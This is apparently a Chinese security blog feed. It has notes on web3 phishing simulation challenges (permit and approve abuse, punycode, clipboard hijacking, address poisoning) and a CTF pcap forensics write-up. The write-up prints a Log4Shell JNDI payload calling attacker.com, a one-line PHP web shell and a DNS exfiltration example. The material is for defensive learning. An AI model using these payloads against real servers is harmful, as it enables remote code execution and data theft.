钱包恢复助手"></a>No.0x0002 钱包恢复助手</h3><p>这是一个ai对话界面，功能是钱包恢复，然后让你输入你的助记词，我看到了这样的字样 “请放心，这是一个安全的环境，您的信息将被加密处理。”然后还真的去找了我的助记词给他添上了，我还特意用ai查了这个平台是否靠谱，结果输入进入，告诉我我被钓鱼了。身为一个学安全的人，我自认为安全意识还是有点的，但是也可能是我还没意识到这个挑战是在做个什么，所以被骗+1。</p><p>所以！！永远不要向任何人透露您的助记词，无论他们声称是谁</p><h3 id="No-0x0003-USDC-Permit-钓鱼模拟"><a href="#No-0x0003-USDC-Permit-钓鱼模拟" class="headerlink" title="No.0x0003 USDC Permit 钓鱼模拟"></a>No.0x0003 USDC Permit 钓鱼模拟</h3><p>这一个内容就到了我要学习的地方，之前没听过。开始学！</p><p>因为一开始还不知道所以还是点了授权，被骗+1</p><blockquote><p>知识点：</p><p><strong>通过使用 EIP-2612 的 <code>permit</code> 签名功能</strong>，用户可以在不预先进行链上授权交易（即无需支付 Gas 费）的情况下，授权第三方合约使用自己的代币（如 USDC、DAI 等）。这是以太坊上一种更高效、更省 Gas 的授权方式，尤其适合优化用户体验（UX）和批量操作。</p><p><strong>1. EIP-2612 <code>permit</code> 的核心机制</strong></p><p><strong>（1）传统授权（<code>approve</code>）的问题</strong></p><ul><li>需要发送一笔链上交易（支付 Gas）。</li><li>用户必须提前授权，导致交互流程变长。</li></ul><p> <strong>（2）<code>permit</code> 的改进</strong></p><p>✅ <strong>免 Gas 授权</strong>：用户签署一条链下消息（签名），第三方合约可凭此签名直接获得代币使用权，无需用户预先发送 <code>approve</code> 交易。<br>✅ <strong>单次有效</strong>：签名可设置过期时间（<code>deadline</code>），避免长期风险。<br>✅ <strong>兼容 ERC-20</strong>：无需修改代币标准，只需代币合约实现 <code>permit</code> 函数。</p><p> <strong>2. <code>permit</code> 的工作原理</strong></p><p> <strong>（1）用户签署离线消息</strong></p><p>用户对以下数据进行签名（使用 EIP-712 结构化签名）：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">{</span><br><span class="line">  owner: "0x用户地址",       // 代币持有者</span><br><span class="line">  spender: "0x合约地址",    // 被授权方（如 Uniswap）</span><br><span class="line">  value: 1000000,          // 授权数量（如 1 USDC = 1e6）</span><br><span class="line">  nonce: 123,              // 防止重放攻击</span><br><span class="line">  deadline: 1698765432     // 过期时间（UNIX 时间戳）</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p> <strong>（2）第三方合约提交签名</strong></p><p>合约调用代币的 <code>permit</code> 方法，传入签名数据：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">token.permit(owner, spender, value, deadline, v, r, s);</span><br></pre></td></tr></tbody></table></figure><ul><li><code>v, r, s</code> 是签名的 ECDSA 参数。</li><li>代币合约验证签名，并更新授权状态（相当于执行了 <code>approve</code>）。</li></ul><p> <strong>3. 安全注意事项</strong></p><p> <strong>✅ 优点</strong></p><ul><li><strong>节省 Gas</strong>：用户只需签一次名，无需单独发 <code>approve</code> 交易。</li><li><strong>更短交互流程</strong>：适合钱包内直接签名授权。</li></ul><p> <strong>⚠️ 风险</strong></p><ul><li><strong>签名钓鱼</strong>：恶意 DApp 可能诱导用户签署高额 <code>permit</code>（检查 <code>value</code> 和 <code>spender</code>）。</li><li><strong>过期时间失效</strong>：若 <code>deadline</code> 过长，签名可能被重复使用（建议设置较短有效期）。</li></ul></blockquote><p>我的理解就是 授权第三方合约使用自己的代币，然后可以省去gas费用</p><p>这个签名将允许攻击者控制您的 USDC 代币！通过使用 EIP-2612 permit 签名，攻击者可以：</p><ul><li>获得对您所有 USDC 的完全访问权限</li><li>在未来任何时间转移您的代币</li><li>无需您进一步批准即可花费您的资金</li></ul><p>安全检查要点</p><ul><li><p>检查 Permit 类型，了解授权范围</p></li><li><p>验证 Spender 地址是否为可信来源</p></li><li><p>注意授权金额，警惕无限制授权</p></li><li><p>确认网站来源的可信度</p></li></ul><p>所以此处不能进行授权</p><h3 id="No-0x0004-专属代币空投"><a href="#No-0x0004-专属代币空投" class="headerlink" title="No.0x0004 专属代币空投"></a>No.0x0004 专属代币空投</h3><p>此交易实际上是向合约 0xbe535a82f2c3895bdaceb3ffe6b9b80ac2f832a0 发送 0.5 ETH，而不是领取任何代币。</p><p>函数选择器 0x5fba79f5 调用了一个名为 SecurityUpdate() 的函数，该函数可能会将您的资金转移给攻击者。</p><p><strong>在真实情况下，永远不要在不了解交易内容的情况下签署交易！</strong></p><h3 id="No-0x0005-USDT-授权钓鱼模拟"><a href="#No-0x0005-USDT-授权钓鱼模拟" class="headerlink" title="No.0x0005 USDT 授权钓鱼模拟"></a>No.0x0005 USDT 授权钓鱼模拟</h3><p>挑战：请小心真实的授权请求</p><p> <strong>授权风险提示：</strong></p><ul><li>除了 approve 外，也要当心 increaseAllowance 函数</li><li>increaseAllowance 同样可以增加代币授权额度</li><li>一些钓鱼网站会通过这个方式来掩饰其真实意图</li></ul><p>💡 安全建议：永远不要给不明来源的网站无限授权！</p><blockquote><p><code>increaseAllowance</code> 是 <strong>ERC-20 代币标准</strong> 中的一个扩展函数，用于<strong>安全地增加</strong>某个地址（<code>spender</code>）的代币授权额度。它是对传统 <code>approve</code> 方法的改进，旨在避免潜在的安全风险（如前端竞态条件攻击）。</p><p><strong>传统 <code>approve</code> 的问题</strong></p><ul><li><p><strong>竞态条件（Race Condition）</strong><br>  如果用户连续发起两笔 <code>approve</code> 交易（例如先授权 100，再改为 200），矿工可能以相反顺序打包交易，导致最终授权额度被意外覆盖（变成 100 而非 200）。</p><p>  solidity</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 危险操作：可能被覆盖</span><br><span class="line">approve(spender, 100);  // 交易1</span><br><span class="line">approve(spender, 200);  // 交易2</span><br></pre></td></tr></tbody></table></figure></li></ul><p> <strong><code>increaseAllowance</code> 的解决方案</strong></p><p>✅ <strong>增量调整</strong>：基于当前授权额度增加数值，而非直接覆盖。<br>✅ <strong>安全操作</strong>：避免竞态条件，适合前端交互。</p></blockquote><h3 id="No-0x0006-假冒代币空投钓鱼攻击"><a href="#No-0x0006-假冒代币空投钓鱼攻击" class="headerlink" title="No.0x0006 假冒代币空投钓鱼攻击"></a>No.0x0006 假冒代币空投钓鱼攻击</h3><p>挑战：识别真假域名</p><ul><li>场景描述</li></ul><p>某天，你收到一封电子邮件，声称你有资格获得UNI代币的空投！邮件中包含一个链接，引导你到一个看似合法的网站。你点击了该链接，并看到以下交易记录：</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20144514.png" style="zoom:67%;"><p>仔细观察上面的交易记录。这种钓鱼攻击通常利用视觉上相似的字符（如用数字”1”替代字母”i”）来欺骗用户。</p><p><strong>安全建议</strong></p><ul><li>始终逐字符检查域名</li><li>警惕使用数字代替字母的域名（例如，用’1’代替’i’）</li><li>收藏官方网站而不是点击电子邮件中的链接</li><li>使用密码管理器，它只会在合法域名上自动填充</li><li>安装警告钓鱼网站的浏览器扩展</li></ul><h3 id="No-0x0007-超高收益质押平台"><a href="#No-0x0007-超高收益质押平台" class="headerlink" title="No.0x0007 超高收益质押平台"></a>No.0x0007 超高收益质押平台</h3><p>挑战：了解如何识别可疑的质押合约</p><p>某些可疑的质押合约可能会引导您进行 <strong>approve</strong> 授权，表面上看似只为了质押特定金额，实际上却请求对整个代币余额的完全访问权限。一旦授权成功，攻击者即可任意转走您的所有资产。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20145026.png" style="zoom:67%;"><p>如上图，存在approve方法需要谨慎！！</p><blockquote><p><code>approve</code> 是 <strong>ERC-20 代币标准</strong> 中的一个核心方法，用于授权另一个地址（通常是智能合约）代表你支配一定数量的代币。它是 DeFi（去中心化金融）交互的基础，但错误使用可能导致资金风险。</p></blockquote><h3 id="No-0x0008-Telegram-代币钓鱼挑战"><a href="#No-0x0008-Telegram-代币钓鱼挑战" class="headerlink" title="No.0x0008 Telegram 代币钓鱼挑战"></a>No.0x0008 Telegram 代币钓鱼挑战</h3><p>挑战：学习识别和避免 Telegram 上的助记词钓鱼攻击</p><p>风险点依旧是提供助记词，所以千万不要给别人提供自己钱包的助记词！！！</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20145933.png" style="zoom:67%;"><h3 id="No-0x0009-Punycode-钓鱼攻击"><a href="#No-0x0009-Punycode-钓鱼攻击" class="headerlink" title="No.0x0009 Punycode 钓鱼攻击"></a>No.0x0009 Punycode 钓鱼攻击</h3><p>挑战：识别 Punycode 钓鱼域名</p><ul><li>场景描述</li></ul><p>您收到一封电子邮件，声称是来自 Trezor（一个知名的硬件钱包品牌）的重要安全更新通知。电子邮件中的链接看起来像是指向官方 Trezor 网站，但实际上是一个精心伪装的钓鱼网站。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">trẹzor.com</span><br><span class="line">看起来像正常的 Trezor 域名</span><br></pre></td></tr></tbody></table></figure><blockquote><h4 id="什么是-Punycode？"><a href="#什么是-Punycode？" class="headerlink" title="什么是 Punycode？"></a>什么是 Punycode？</h4><p>Punycode 是一种编码系统，允许将非 ASCII 字符（如西里尔字母、中文等）转换为 ASCII 字符，以便在域名系统中使用。攻击者经常利用视觉上相似的字符创建看似合法的域名。 例如，某些特殊字符看起来与拉丁字母几乎相同，但它们是不同的字符： 你可以使用 <a href="https://www.punycoder.com/">Punycoder</a> 来转换 Unicode 和 Punycode 域名。</p><table><thead><tr><th align="left">显示域名</th><th align="left">实际 Punycode 域名</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">trẹzor.com</td><td align="left">xn–trzor-o51b.com</td><td align="left">使用特殊字符替换了某些字母</td></tr></tbody></table></blockquote><p>所以 trezor的官方域名应该为trezor.io</p><p>防御方式：</p><ul><li>直接在浏览器中输入已知的官方网址，而不是点击电子邮件中的链接</li><li>使用书签保存常用的重要网站</li><li>安装可以检测 Punycode 域名的浏览器扩展</li><li>注意域名中不寻常的字符或拼写</li></ul><h3 id="No-0x0010-剪贴板钓鱼挑战"><a href="#No-0x0010-剪贴板钓鱼挑战" class="headerlink" title="No.0x0010 剪贴板钓鱼挑战"></a>No.0x0010 剪贴板钓鱼挑战</h3><p>挑战：识别剪贴板型钓鱼攻击</p><ul><li>场景描述</li></ul><p>您需要转账 1 ETH 到朋友的钱包。他们已经分享了他们的钱包地址，您正在使用加密货币转账界面进行转账。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20150754.png" style="zoom:50%;"><p>复制粘贴之后，发现钱包地址与之前的不同了</p><ul><li>攻击原理：</li></ul><ol><li>攻击者创建一个看似合法的网站</li><li>当你点击”复制”按钮时，恶意JavaScript代码会秘密替换复制的地址</li><li>如果粘贴后没有验证地址，你可能会将资金发送给攻击者</li></ol><ul><li><p>防御方式：</p><ul><li><p>粘贴后务必再次检查地址</p></li><li><p>考虑使用带有地址验证的硬件钱包</p></li><li><p>在电脑上复制敏感信息（如钱包地址）时要特别小心 - 即使使用Ctrl+C，恶意软件也可能篡改你的剪贴板内容</p></li></ul></li></ul><h3 id="No-0x0011-Google-搜索广告钓鱼攻击"><a href="#No-0x0011-Google-搜索广告钓鱼攻击" class="headerlink" title="No.0x0011 Google 搜索广告钓鱼攻击"></a>No.0x0011 Google 搜索广告钓鱼攻击</h3><p>挑战：识别 Google 搜索广告钓鱼</p><ul><li>场景描述</li></ul><p>您想要使用 Lido Finance 质押 ETH。在 Google 上搜索”Lido Finance”时看到这些结果。您能识别出哪个是合法网站，哪个是钓鱼网站吗？</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20151348.png" style="zoom:67%;"><p>看第一条的左上角有一个Ad，是广告的意思，怀疑是钓鱼网站</p><p>辨别网站真伪的方法：</p><ul><li>攻击者经常购买与热门加密货币项目相关的 Google 广告，这些广告会出现在搜索结果的顶部，标记为”赞助”或”广告”。</li><li>这些广告通常使用与官方网站非常相似的域名，但有细微的差别，例如：<ul><li>使用不同的顶级域名（如用 .is 代替 .fi）</li><li>在域名中添加或删除字母</li><li>使用连字符或用数字替换字母</li><li>当用户点击这些广告时，他们会被引导到看起来与官方网站完全相同的钓鱼网站，这些网站旨在窃取资金或私钥。</li></ul></li></ul><h3 id="No-0x0012-Microsoft-Teams-钓鱼攻击"><a href="#No-0x0012-Microsoft-Teams-钓鱼攻击" class="headerlink" title="No.0x0012 Microsoft Teams 钓鱼攻击"></a>No.0x0012 Microsoft Teams 钓鱼攻击</h3><p>本页面模拟攻击者如何创建虚假的 Microsoft Teams 网站来分发恶意软件和窃取敏感信息。</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20151843.png" style="zoom:67%;"><p>本示例中的钓鱼指标</p><ul><li><strong>可疑 URL</strong>：注意域名是 “microsoft-meet.com” 而不是 “teams.microsoft.com”</li><li><strong>简化界面</strong>：与真实的 Teams 登录相比，虚假页面具有简化的界面</li><li><strong>缺乏安全功能</strong>：缺少 Microsoft 通常包含的安全元素</li><li><strong>加入按钮</strong>：突出的 “在 Teams 应用程序中加入” 按钮可能会导致恶意软件下载</li></ul><p>安全提示</p><ul><li>在输入凭据或下载软件之前，始终验证 URL。</li><li>仅从官方 Microsoft 网站或应用商店下载 Microsoft Teams。</li><li>对任何异常的安装过程或请求保持警惕。</li><li>如果您下载了可疑的软件包，可以在打开之前使用 <a href="https://www.virustotal.com/">VirusTotal.com</a> 进行扫描。但请注意，即使没有检测到威胁（0 检测），也不能保证绝对安全。</li></ul><blockquote><h2 id="Microsoft-Teams-钓鱼攻击的工作原理"><a href="#Microsoft-Teams-钓鱼攻击的工作原理" class="headerlink" title="Microsoft Teams 钓鱼攻击的工作原理"></a>Microsoft Teams 钓鱼攻击的工作原理</h2><p>攻击者创建令人信服的 Microsoft Teams 登录页面或更新通知的复制品，诱骗用户下载恶意软件或泄露其凭据。这些攻击变得越来越复杂，针对个人和组织。</p><p>风险1：数据泄露</p><p>通过虚假 Teams 更新安装的恶意软件可以访问您设备上的敏感文件，可能导致未经授权访问个人和公司数据。这可能导致知识产权盗窃、机密信息泄露和合规违规。</p><p>风险2：凭据盗窃</p><p>当用户在虚假 Teams 网站上输入其 Microsoft 凭据时，攻击者会捕获这些信息以获取对电子邮件、OneDrive、SharePoint 和其他 Microsoft 365 服务的访问权限。这可能导致账户被接管并进一步危及组织资源。</p><p>风险3：钱包资金耗尽</p><p>对于从同一设备访问加密货币钱包或金融服务的用户，通过虚假 Teams 更新安装的恶意软件可能包含扫描钱包凭据的功能，导致数字资产被盗。</p></blockquote><h3 id="No-0x0037-虚假扩展程序钓鱼"><a href="#No-0x0037-虚假扩展程序钓鱼" class="headerlink" title="No.0x0037 虚假扩展程序钓鱼"></a>No.0x0037 虚假扩展程序钓鱼</h3><p>挑战：识别出虚假扩展程序</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20155308.png" style="zoom: 50%;"><p>扩展程序安全最佳实践：</p><ul><li>始终从官方网站下载：直接访问官方网站（例如 metamask.io），而不是在扩展商店中搜索。虚假或恶意扩展程序可能出现在搜索结果中，甚至出现在官方扩展商店中，有时会模仿真实扩展程序的名称、图标或品牌。通过访问官方网站，您可以确保获得正宗、安全的版本，避免落入可能危及您安全和资产的仿冒或诈骗列表的陷阱。</li><li>检查用户数量和评论：官方扩展程序拥有大量用户和普遍积极的评论</li><li>仔细阅读权限：只授予必要的权限</li><li>保持扩展程序更新：定期更新通常包含安全补丁</li><li>删除未使用的扩展程序：通过删除不再使用的扩展程序来减少攻击面</li></ul><h3 id="中级"><a href="#中级" class="headerlink" title="中级"></a>中级</h3><h3 id="No-0x0013-TransferFrom-零值转账钓鱼挑战"><a href="#No-0x0013-TransferFrom-零值转账钓鱼挑战" class="headerlink" title="No.0x0013 TransferFrom 零值转账钓鱼挑战"></a>No.0x0013 TransferFrom 零值转账钓鱼挑战</h3><p>挑战：学习识别和避免零值转账诈骗</p><p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-05%20153732.png"></p><p>发现我的钱包地址和发送方发送到接收方的地址不同</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我的钱包：   0x1234ab7890123456781232345678901234567890</span><br><span class="line">发送方的发送到的地址：0x1234ab789012345678abc2345678901234567890</span><br></pre></td></tr></tbody></table></figure><p>诈骗者经常使用零值转账来创建与伪造地址的虚假交易历史，让受害者以为该地址为可信地址，从而做到地址混淆，让受害者向攻击方地址进行转账。</p><p>如何保护自己：</p><ul><li><strong>始终验证完整地址</strong>，而不仅仅是开头和结尾</li><li>警惕看起来与您之前交互过的地址相似的地址</li><li>仔细检查交易历史，包括零值转账</li><li>使用钱包的地址簿功能标记可信地址</li><li>考虑使用带有地址验证功能的硬件钱包</li></ul><blockquote><h3 id="诈骗者利用“零值转账”伪造交易历史的原理及防范措施"><a href="#诈骗者利用“零值转账”伪造交易历史的原理及防范措施" class="headerlink" title="诈骗者利用“零值转账”伪造交易历史的原理及防范措施"></a><strong>诈骗者利用“零值转账”伪造交易历史的原理及防范措施</strong></h3><h4 id="1-攻击原理"><a href="#1-攻击原理" class="headerlink" title="1. 攻击原理"></a><strong>1. 攻击原理</strong></h4><p>诈骗者通过发送 <strong>零值转账（0 ETH 或 0 代币）</strong> 到 <strong>伪造地址</strong>，目的是在区块链浏览器（如 Etherscan）上制造虚假的交易历史，诱导受害者误认为该地址是可信的。具体手法如下：</p><ul><li><strong>伪造交易历史</strong>：<br>  攻击者向目标地址（如 <code>0x123...abc</code>）发送多笔 <code>0 ETH</code> 转账，使该地址在 Etherscan 上显示与“知名地址”（如交易所、项目方）有交互记录。<ul><li>例如：攻击者可能伪造一个与 <strong>Uniswap 路由合约</strong> 相似的地址，并提前用零值转账制造“活跃记录”。</li></ul></li><li><strong>地址混淆（Address Poisoning）</strong>：<br>  攻击者生成一个与受害者常用地址 <strong>开头和结尾相似</strong> 的地址（如 <code>0x1234...5678</code> vs <code>0x1234...9876</code>），并发送零值转账，使受害者在复制粘贴时误选错误地址。</li><li><strong>诱导转账</strong>：<br>  当受害者看到该地址有“历史交易”时，可能误以为是合法地址，从而将资金转入诈骗者的钱包。</li></ul></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>磐石行动CTF</title>
      <link href="/2025/08/06/pan-shi-xing-dong-ctf/"/>
      <url>/2025/08/06/pan-shi-xing-dong-ctf/</url>
      
        <content type="html"><![CDATA[<h1 id="磐石行动CTF"><a href="#磐石行动CTF" class="headerlink" title="磐石行动CTF"></a>磐石行动CTF</h1><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="derderjia"><a href="#derderjia" class="headerlink" title="derderjia"></a>derderjia</h3><blockquote><p>题目：该死，一头狡猾的马攻击了我的服务器，并在上面上传了一个隐秘的文件，请你帮我找到这个文件，来惩治它。</p></blockquote><p>1、拿到一个derderjia.pcapng，导出所有对象，有一个文件中包含<strong>TLS 1.3 会话密钥</strong></p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121054.png" style="zoom: 33%;"><p>2、将其导入wireshark的TLS配置中，这样就可以解密TLS的密文</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20121225.png" style="zoom: 50%;"><p>3、追踪TLS流，发现有一个文件上传的数据包</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20115238.png" style="zoom: 50%;"><p>4、将该数据包以原始数据的格式保存到本地，然后删除数据包的首尾，只保留数据本身，发现是PK开头，是一个ZIP数据包，更改为zip后缀，然后解压，发现需要密码，继续回wireshark查找</p><p>5、在GET请求/的数据包中，看到在进行UA的jndi注入</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20101210.png" style="zoom: 67%;"><p>6、查找了一下资料，该种注入可能会在DNS种传输数据，那么查看DNS数据，发现存在base64加密数据，</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102401.png" style="zoom:67%;"><p>7、解密之后得到压缩包的解压密码</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20102406.png" style="zoom: 50%;"><p>8、解压后得到一个图片，但是没有flag</p><p>9、使用随波逐流自动改宽高，得到flag</p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN//img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-08-06%20120532.png" style="zoom:50%;"><blockquote><p>拓展知识：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: ${jndi:ldap://attacker.com/a}\r\n</span><br></pre></td></tr></tbody></table></figure><p><strong>Log4Shell (CVE-2021-44228)</strong> 漏洞攻击</p><h2 id="1-这是什么攻击？"><a href="#1-这是什么攻击？" class="headerlink" title="1. 这是什么攻击？"></a><strong>1. 这是什么攻击？</strong></h2><p>这是针对 <strong>Log4j 2.x</strong> 日志库的远程代码执行（RCE）漏洞利用尝试，称为 <strong>Log4Shell</strong>。</p><hr><h2 id="2-攻击原理"><a href="#2-攻击原理" class="headerlink" title="2. 攻击原理"></a><strong>2. 攻击原理</strong></h2><h3 id="1-攻击者构造恶意字符串"><a href="#1-攻击者构造恶意字符串" class="headerlink" title="(1) 攻击者构造恶意字符串"></a><strong>(1) 攻击者构造恶意字符串</strong></h3><p>http</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: ${jndi:ldap://attacker.com/a}</span><br></pre></td></tr></tbody></table></figure><ul><li><code>${jndi:ldap://attacker.com/a}</code> 是一个 <strong>Log4j 表达式</strong>，如果被记录到日志，Log4j 会解析并执行它。</li></ul><h3 id="2-Log4j-解析恶意日志"><a href="#2-Log4j-解析恶意日志" class="headerlink" title="(2) Log4j 解析恶意日志"></a><strong>(2) Log4j 解析恶意日志</strong></h3><ul><li>当服务器使用 <strong>Log4j 2.x</strong> 记录 <code>User-Agent</code> 时，会解析 <code>${jndi:ldap://attacker.com/a}</code>。</li><li><code>jndi</code> 表示 <strong>Java Naming and Directory Interface</strong>（Java 命名和目录接口），可以加载远程对象。</li><li><code>ldap://attacker.com/a</code> 指向攻击者控制的 <strong>LDAP 服务器</strong>。</li></ul><h3 id="3-服务器连接攻击者的-LDAP"><a href="#3-服务器连接攻击者的-LDAP" class="headerlink" title="(3) 服务器连接攻击者的 LDAP"></a><strong>(3) 服务器连接攻击者的 LDAP</strong></h3><ul><li>受害服务器会向 <code>attacker.com</code> 请求恶意代码。</li><li>LDAP 服务器返回一个 <strong>恶意 Java 类</strong>（如反弹 shell、挖矿木马等）。</li></ul><h3 id="4-服务器执行恶意代码"><a href="#4-服务器执行恶意代码" class="headerlink" title="(4) 服务器执行恶意代码"></a><strong>(4) 服务器执行恶意代码</strong></h3><ul><li>Log4j 动态加载并执行攻击者提供的代码，导致 <strong>远程命令执行</strong>（RCE）。</li></ul><p>根据题目描述，攻击者通过 <strong>Log4Shell (CVE-2021-44228)</strong> 漏洞入侵了服务器，并上传了一个隐秘文件。我们需要在 <strong>Wireshark 抓包数据</strong> 中分析可能的文件传输行为。</p><hr><h2 id="步骤-1：确认攻击流量"><a href="#步骤-1：确认攻击流量" class="headerlink" title="步骤 1：确认攻击流量"></a><strong>步骤 1：确认攻击流量</strong></h2><p>首先，检查是否有 <strong>JNDI/LDAP 恶意请求</strong>（如 <code>${jndi:ldap://attacker.com/...}</code>）：</p><ol><li>在 Wireshark 中按 <code>Ctrl + F</code> 搜索 <code>${jndi:</code> 或 <code>ldap://</code>。</li><li>如果找到相关流量，说明攻击者利用了 <strong>Log4Shell</strong>。</li></ol><hr><h2 id="步骤-2：查找文件上传"><a href="#步骤-2：查找文件上传" class="headerlink" title="步骤 2：查找文件上传"></a><strong>步骤 2：查找文件上传</strong></h2><p>攻击者可能通过以下方式上传文件：</p><ol><li><strong>HTTP POST 请求</strong>（常见于 Web Shell 上传）</li><li><strong>FTP/TFTP 传输</strong>（如果服务器开放了文件传输服务）</li><li><strong>Base64 编码传输</strong>（隐藏在 HTTP 请求或 LDAP 响应中）</li><li><strong>DNS 隐蔽通道</strong>（较少见，但可能用于小文件传输）</li></ol><h3 id="方法-1：检查-HTTP-请求"><a href="#方法-1：检查-HTTP-请求" class="headerlink" title="方法 1：检查 HTTP 请求"></a><strong>方法 1：检查 HTTP 请求</strong></h3><ul><li><p>在 Wireshark 过滤器中输入：</p><p>  text</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request.method == "POST"</span><br></pre></td></tr></tbody></table></figure></li><li><p>查看是否有 <strong>文件上传</strong>（如 <code>.jsp</code>、<code>.php</code>、<code>.war</code> 等 Web Shell）。</p></li></ul><h3 id="方法-2：检查-FTP-TFTP-SMB"><a href="#方法-2：检查-FTP-TFTP-SMB" class="headerlink" title="方法 2：检查 FTP/TFTP/SMB"></a><strong>方法 2：检查 FTP/TFTP/SMB</strong></h3><ul><li><p>过滤：</p><p>  text</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp || tftp || smb</span><br></pre></td></tr></tbody></table></figure></li><li><p>查找 <strong>文件传输</strong>（如 <code>STOR</code>、<code>PUT</code> 命令）。</p></li></ul><h3 id="方法-3：检查-LDAP-JNDI-响应"><a href="#方法-3：检查-LDAP-JNDI-响应" class="headerlink" title="方法 3：检查 LDAP/JNDI 响应"></a><strong>方法 3：检查 LDAP/JNDI 响应</strong></h3><ul><li>攻击者可能通过 <strong>LDAP 返回恶意类</strong>（<code>.class</code> 文件）。</li><li>查找 <strong>LDAP 响应包</strong>，检查是否包含 <strong>Java 字节码</strong> 或 <strong>Base64 编码数据</strong>。</li></ul><h3 id="方法-4：检查-DNS-隐蔽通道"><a href="#方法-4：检查-DNS-隐蔽通道" class="headerlink" title="方法 4：检查 DNS 隐蔽通道"></a><strong>方法 4：检查 DNS 隐蔽通道</strong></h3><ul><li><p>过滤：</p><p>  text</p>  <figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dns</span><br></pre></td></tr></tbody></table></figure></li><li><p>查找 <strong>异常长域名</strong>（如 <code>aGVsbG8gd29ybGQ=.attacker.com</code>，可能是 Base64 编码文件）。</p></li></ul><hr><h2 id="步骤-3：提取文件"><a href="#步骤-3：提取文件" class="headerlink" title="步骤 3：提取文件"></a><strong>步骤 3：提取文件</strong></h2><h3 id="情况-1：HTTP-上传"><a href="#情况-1：HTTP-上传" class="headerlink" title="情况 1：HTTP 上传"></a><strong>情况 1：HTTP 上传</strong></h3><ol><li>找到 <strong>POST 请求</strong>，右键 → <strong>Follow → HTTP Stream</strong>。</li><li>检查是否有 <strong>文件内容</strong>（如 <code>&lt;?php system($_GET["cmd"]); ?&gt;</code>）。</li></ol><h3 id="情况-2：FTP-TFTP-上传"><a href="#情况-2：FTP-TFTP-上传" class="headerlink" title="情况 2：FTP/TFTP 上传"></a><strong>情况 2：FTP/TFTP 上传</strong></h3><ol><li>找到 <strong>STOR/PUT 命令</strong>，右键 → <strong>Follow → TCP Stream</strong>。</li><li>提取传输的文件数据。</li></ol><h3 id="情况-3：LDAP-返回恶意类"><a href="#情况-3：LDAP-返回恶意类" class="headerlink" title="情况 3：LDAP 返回恶意类"></a><strong>情况 3：LDAP 返回恶意类</strong></h3><ol><li>找到 <strong>LDAP 响应包</strong>，查看返回的 <strong>Java 类数据</strong>。</li><li>可以保存为 <code>.class</code> 并用 <code>javap -c</code> 反编译。</li></ol><h3 id="情况-4：Base64-DNS-隐蔽传输"><a href="#情况-4：Base64-DNS-隐蔽传输" class="headerlink" title="情况 4：Base64/DNS 隐蔽传输"></a><strong>情况 